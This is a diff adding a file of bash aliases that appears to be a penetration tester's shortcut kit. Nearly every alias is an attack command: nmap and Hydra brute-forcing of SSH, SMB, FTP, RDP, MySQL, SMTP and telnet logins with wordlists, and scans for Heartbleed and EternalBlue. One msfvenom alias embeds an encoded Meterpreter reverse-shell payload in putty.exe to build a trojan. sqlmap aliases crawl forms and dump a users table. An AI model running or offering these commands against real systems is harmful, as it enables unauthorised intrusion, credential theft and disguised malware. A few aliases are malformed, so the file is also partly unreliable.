@@ -1,0 +1,44 @@
+alias update='sudo apt-get update && sudo apt-get full-upgrade -y && sudo apt autoremove -y'
+
+alias subnet='echo -n "Enter IP with subnet e.g. /24: " && read IP && sudo nmap $IP'
+
+alias 100portscan='echo -n "Enter IP: " && read IP && sudo nmap -F -A $IP'
+
+alias scan='echo -n "Enter IP: " && read IP && sudo nmap -T4 -A -sS -v $IP'
+
+alias heartscan='echo -n "Enter IP: " && read IP && sudo nmap -sV -p 443 –script=ssl-heartbleed $IP'
+
+alias infoscan='echo -n "Enter IP: " && read IP && sudo nmap --script=asn-query,whois,ip-geolocation-maxmind $IP'
+
+alias smb_brute='echo -n "Enter IP: " && read IP && sudo nmap -p445 --script smb-brute --script-args userdb=users.txt,passdb=passwords.txt $IP'  
+
+alias ssh_brute='echo -n "Enter IP: " && read IP && sudo nmap -p 22 --script ssh-brute --script-args userdb=users.lst,passdb=pass.lst \
+      --script-args ssh-brute.timeout=4s $IP'
+      
+alias ftp_brute='echo -n "Enter IP: " && read IP && sudo nmap --script ftp-brute -p 21 $IP'
+
+alias http_brute='echo -n "Enter IP: " && read IP && sudo nmap --script http-brute -p 80 $IP'
+
+alias mysql_brute='echo -n "Enter IP: " && read IP && sudo nmap --script=mysql-brute $IP'
+
+alias smtp_brute='echo -n "Enter IP: " && read IP && sudo nmap -p 25 --script smtp-brute $IP'
+
+alias tel_brute='echo -n "Enter IP: " && read IP && sudo nmap -p 23 --script telnet-brute --script-args userdb=usernames.txt,passdb=passwords.txtlst,telnet-brute.timeout=8s $IP'
+
+alias eternalscan='echo -n "Enter IP: " && read IP && sudo nmap -p445 --script smb-vuln-ms17-010 $IP'
+
+alias pwnwintcp='echo -n "Enter Lhost: " && read Lhost && echo -n "Enter Lport: " && read Lport && msfvenom -p windows/meterpreter/reverse_tcp LHOST=$Lhost LPORT=$Lport -f raw -e x86/shikata_ga_nai -i 9 | msfvenom -a x86 --platform windows -e x86/countdown -i 8 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 11 -f raw | msfvenom -a x86 --platform windows -e x86/countdown -i 6 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 7 -x /root/putty.exe -k -f exe -o pnwd.exe 
+
+alias hydraftp='echo -n "Enter IP: " && read IP && sudo hydra -t 1 -l admin -P /usr/share/wordlists/rockyou.txt -vV $IP ftp'
+
+alias hydrassh='echo -n "Enter IP: " && read IP && sudo hydra -v -V -u -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt -t 1 -u $IP ssh'
+
+alias hydrawin='echo -n "Enter IP: " && read IP && sudo hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$IP' 
+
+alias autosqlmap='echo -n "Enter site e.g. http://pwnme.com: " && read HTTP && sqlmap -u $HTTP --forms --batch --crawl=10 
+ --cookie=jsessionid=54321 --level=5 --risk=3'
+ 
+ alias sqldump='echo -n "Enter site e.g. http://pwnme.com: " && read HTTP && sqlmap -o -u "$HTTP" --forms 
+ -D database-name -T users --dump'
+ 
+ 
